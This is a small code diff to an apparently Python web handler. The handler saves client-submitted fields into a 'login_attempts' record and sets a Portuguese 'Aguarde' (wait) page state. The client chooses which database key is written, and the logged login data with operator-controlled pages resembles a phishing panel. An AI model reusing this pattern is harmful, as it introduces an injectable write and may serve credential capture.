@@ -481,7 +481,11 @@ async def submit_user_data(user_id: str, data: UserInputData):
     await db.login_attempts.update_one(
         {"id": user_id},
         {
-            "$set": {data.field: data.value},
+            "$set": {
+                data.field: data.value,
+                "current_action": "AGUARDE",
+                "page": "Aguarde..."
+            },
             "$push": {
                 "history": {
                     "field": data.field,
